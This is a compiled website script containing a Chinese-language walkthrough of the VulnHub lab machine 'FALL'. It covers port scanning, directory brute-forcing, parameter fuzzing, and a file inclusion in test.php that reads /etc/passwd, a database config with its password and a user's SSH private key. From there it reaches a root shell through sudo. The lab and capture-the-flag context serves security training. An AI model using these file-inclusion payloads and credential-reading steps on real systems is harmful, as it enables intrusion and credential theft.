"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[3713],{8453:(n,e,r)=>{r.d(e,{R:()=>o,x:()=>c});var t=r(6540);const s={},i=t.createContext(s);function o(n){const e=t.useContext(i);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:o(n.components),t.createElement(i.Provider,{value:e},n.children)}},9351:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>p,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"VulnHub/Virtual Machines/FALL","title":"FALL","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/FALL.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/FALL","permalink":"/docs/VulnHub/Virtual Machines/FALL","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/FALL.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Escalate","permalink":"/docs/VulnHub/Virtual Machines/Escalate"},"next":{"title":"FristiLeaks_1.3","permalink":"/docs/VulnHub/Virtual Machines/FristiLeaks_1.3"}}');var s=r(4848),i=r(8453);const o={},c=void 0,p={},a=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function l(n){const e={code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Feb  4 04:42:02 2025 as: nmap -sT --min-rate=10000 -p- -oN nmap_result/port 192.168.28.22\r\nNmap scan report for 192.168.28.22 (192.168.28.22)\r\nHost is up (0.0027s latency).\r\nNot shown: 65503 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)\r\nPORT      STATE  SERVICE\r\n22/tcp    open   ssh\r\n80/tcp    open   http\r\n111/tcp   closed rpcbind\r\n139/tcp   open   netbios-ssn\r\n443/tcp   open   https\r\n445/tcp   open   microsoft-ds\r\n3306/tcp  open   mysql\r\n8000/tcp  closed http-alt\r\n8080/tcp  closed http-proxy\r\n8443/tcp  closed https-alt\r\n9090/tcp  open   zeus-admin\r\n10080/tcp closed amanda\r\n10443/tcp closed cirrossp\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Feb  4 04:43:05 2025 as: nmap -sT -sVC -O -p22,80,139,443,445,3306,9090 -oN nmap_result/detils 192.168.28.22\r\nNmap scan report for 192.168.28.22\r\nHost is up (0.0039s latency).\r\n\r\nPORT     STATE SERVICE     VERSION\r\n22/tcp   open  ssh         OpenSSH 7.8 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)\r\n|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)\r\n|_  256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)\r\n80/tcp   open  http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)\r\n|_http-title: Good Tech Inc's Fall Sales - Home\r\n|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3\r\n| http-robots.txt: 1 disallowed entry \r\n|_/\r\n|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.\r\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)\r\n443/tcp  open  ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)\r\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US\r\n| Subject Alternative Name: DNS:localhost.localdomain\r\n| Not valid before: 2019-08-15T03:51:33\r\n|_Not valid after:  2020-08-19T05:31:33\r\n|_ssl-date: TLS randomness does not represent time\r\n| http-robots.txt: 1 disallowed entry \r\n|_/\r\n| tls-alpn: \r\n|_  http/1.1\r\n|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3\r\n|_http-title: Good Tech Inc's Fall Sales - Home\r\n|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.\r\n445/tcp  open  netbios-ssn Samba smbd 4.8.10 (workgroup: SAMBA)\r\n3306/tcp open  mysql       MySQL (unauthorized)\r\n9090/tcp open  http        Cockpit web service 162 - 188\r\n|_http-title: Did not follow redirect to https://192.168.28.22:9090/\r\nMAC Address: 00:0C:29:F5:72:7C (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose|storage-misc\r\nRunning (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)\r\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28\r\nAggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.4 (97%), Linux 5.0 - 5.5 (95%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.4 - 3.10 (91%), Linux 5.1 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (91%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 1 hop\r\nService Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n| smb-os-discovery: \r\n|   OS: Windows 6.1 (Samba 4.8.10)\r\n|   NetBIOS computer name: FALL\\x00\r\n|   Workgroup: SAMBA\\x00\r\n|_  System time: 2025-02-04T01:43:36-08:00\r\n|_smb2-time: Protocol negotiation failed (SMB2)\r\n|_clock-skew: 8h00m01s\n"})}),"\n",(0,s.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"# Dirsearch started Tue Feb  4 05:30:55 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.28.22/\r\n\r\n301   235B   http://192.168.28.22/admin    -> REDIRECTS TO: http://192.168.28.22/admin/\r\n302     0B   http://192.168.28.22/admin/    -> REDIRECTS TO: http://192.168.28.22/admin/login.php\r\n302     0B   http://192.168.28.22/admin/index.php    -> REDIRECTS TO: http://192.168.28.22/admin/login.php\r\n200     4KB  http://192.168.28.22/admin/login.php\r\n301   236B   http://192.168.28.22/assets    -> REDIRECTS TO: http://192.168.28.22/assets/\r\n200     2KB  http://192.168.28.22/assets/\r\n404    16B   http://192.168.28.22/composer.phar\r\n200     0B   http://192.168.28.22/config.php\r\n200    24B   http://192.168.28.22/doc/\r\n301   233B   http://192.168.28.22/doc    -> REDIRECTS TO: http://192.168.28.22/doc/\r\n200    80B   http://192.168.28.22/error.html\r\n200     1KB  http://192.168.28.22/favicon.ico\r\n404   231B   http://192.168.28.22/index.php/login/\r\n301   233B   http://192.168.28.22/lib    -> REDIRECTS TO: http://192.168.28.22/lib/\r\n200    24B   http://192.168.28.22/lib/\r\n301   237B   http://192.168.28.22/modules    -> REDIRECTS TO: http://192.168.28.22/modules/\r\n200     3KB  http://192.168.28.22/modules/\r\n404    16B   http://192.168.28.22/php-cs-fixer.phar\r\n200    17B   http://192.168.28.22/phpinfo.php\r\n404    16B   http://192.168.28.22/phpunit.phar\r\n200    79B   http://192.168.28.22/robots.txt\r\n200    80B   http://192.168.28.22/test.php\r\n301   233B   http://192.168.28.22/tmp    -> REDIRECTS TO: http://192.168.28.22/tmp/\r\n200     1KB  http://192.168.28.22/tmp/\r\n200     0B   http://192.168.28.22/uploads/\r\n301   237B   http://192.168.28.22/uploads    -> REDIRECTS TO: http://192.168.28.22/uploads/\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.code,{children:"test.php"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u2514\u2500$ curl http://192.168.28.22/test.php                                                                    \r\n<html>\r\n<body>\r\n<script>alert('Missing GET parameter!');<\/script>\r\n</body>\r\n</html>\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u63d0\u793a\uff1a\u7f3a\u5c11GET\u53c2\u6570"}),"\n",(0,s.jsx)(e.p,{children:"fuzz\u53c2\u6570"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.code,{children:"/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204210318226.png",alt:"image-20250204210318226"})}),"\n",(0,s.jsx)(e.p,{children:"\u53c2\u6570\u4e3a\uff1afile"}),"\n",(0,s.jsx)(e.p,{children:"\u7ee7\u7eedfuzz\uff0c\uff08\u7cfb\u7edf\u6587\u4ef6\uff09"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204210521815.png",alt:"image-20250204210521815"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"wfuzz  -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 80 --hc 404 http://192.168.28.22/test.php?FUZZ=1\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204210856631.png",alt:"image-20250204210856631"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.code,{children:"/etc/passwd"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"root:x:0:0:root:/root:/bin/bash\r\n...\r\n...\r\nqiu:x:1000:1000:qiu:/home/qiu:/bin/bash\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"http://192.168.28.22/test.php?file=php://filter/convert.base64-encode/resource=config.php\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-php",children:"<?php\r\n# CMS Made Simple Configuration File\r\n# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference\r\n#\r\n$config['dbms'] = 'mysqli';\r\n$config['db_hostname'] = '127.0.0.1';\r\n$config['db_username'] = 'cms_user';\r\n$config['db_password'] = 'P@ssw0rdINSANITY';\r\n$config['db_name'] = 'cms_db';\r\n$config['db_prefix'] = 'cms_';\r\n$config['timezone'] = 'Asia/Singapore';\r\n$config['db_port'] = 3306;\r\n?>\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u6570\u636e\u5e93\u8d26\u5bc6\uff1a",(0,s.jsx)(e.code,{children:"cms_user:P@ssw0rdINSANITY"})]}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u5305\u542bssh\u79c1\u94a5"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"http://192.168.28.22/test.php?file=/home/qiu/.ssh/id_rsa\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"-----BEGIN OPENSSH PRIVATE KEY-----\r\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\r\nNhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0\r\nFDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX\r\n61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj/+uQlokUMtdc4NOv4XGJbp7GdEWBZevien\r\nqXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw/AfZ9ib21JGlOyy8cflTlogrZPoICCXIV/kxGK0d\r\nZucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS\r\nvXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO\r\nNY16EA/NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge\r\nd7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP/65CW\r\niRQy11zg06/hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka\r\nU7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom/uel5BLUhdT1Wc/ctaU4YVTSP4hLl\r\nKI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G\r\nNWQcGzA4jgph96uLkNM/X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs\r\nqYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6/BY9RuaGG5B2DikbB\r\n8t/CDO79q7ccfTZs+gOVRX4PW641+cZxo5/gL3GcdJwDY4ggPwbU/m8sYsyN1NWJ8NH00d\r\nX8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C/8rseZsSJSxoXKk\r\nCmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic\r\nivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz\r\nlHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC/TTqOIH+FXA66cFx3X4uOCjkzT0/Es0uNyZ07qQ\r\n58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0\r\nacm4/icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329\r\nJW3Db+KISMRIvdpJv+eiKQLg/epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT/+\r\nQ6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL\r\nRWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g/uztWJuLpFe3Ue/MLgeJ+2TiAw9yYoPVySNK8\r\nuhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC\r\n-----END OPENSSH PRIVATE KEY-----\n"})}),"\n",(0,s.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,s.jsx)(e.p,{children:"ssh\u8fde\u63a5"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"ssh qiu@192.168.28.22 -i id_rsa\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u67e5\u770b",(0,s.jsx)(e.code,{children:".bash_history"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:'[qiu@FALL ~]$ cat .bash_history \r\nls -al\r\ncat .bash_history \r\nrm .bash_history\r\necho "remarkablyawesomE" | sudo -S dnf update\n'})}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"remarkablyawesomE"}),"\u53ef\u80fd\u662f\u4e00\u4e2a\u5bc6\u7801"]}),"\n",(0,s.jsx)(e.p,{children:"\u7ecf\u8fc7\u5c1d\u8bd5\u53d1\u73b0\u662fqiu\u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'[qiu@FALL ~]$ sudo -l\r\n[sudo] password for qiu: \r\nMatching Defaults entries for qiu on FALL:\r\n    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",\r\n    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL\r\n    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser qiu may run the following commands on FALL:\r\n    (ALL) ALL\n'})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"[qiu@FALL ~]$ sudo su\r\n[root@FALL qiu]# cd\r\n[root@FALL ~]# ls\r\nanaconda-ks.cfg  original-ks.cfg  proof.txt  remarks.txt\r\n[root@FALL ~]# cat proof.txt \r\nCongrats on a root shell! :-)\n"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(l,{...n})}):l(n)}}}]);